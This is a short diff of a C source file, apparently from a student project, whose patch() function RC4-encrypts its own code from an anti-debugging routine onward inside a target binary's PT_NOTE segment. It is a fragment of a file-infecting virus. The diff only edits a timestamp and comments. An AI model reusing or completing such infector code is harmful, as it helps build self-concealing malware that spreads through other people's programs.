@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/04/04 17:02:59 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/10 20:09:56 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/11 12:22:03 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -50,10 +50,9 @@ void	patch(t_data *data, uint8_t *map, size_t size)
 
 
 	// step 7 : Encrypt data : begin at antidebug() -> end lib
-	// generate key
 	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
 	_memcpy(data->cpr_key, (uint8_t*)dst, KEY_SIZE);
-	// encrypt
+
   	dst = map + (data->virus.note->p_offset + ((size_t)antidebug - (size_t)start));
 	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)antidebug);
 
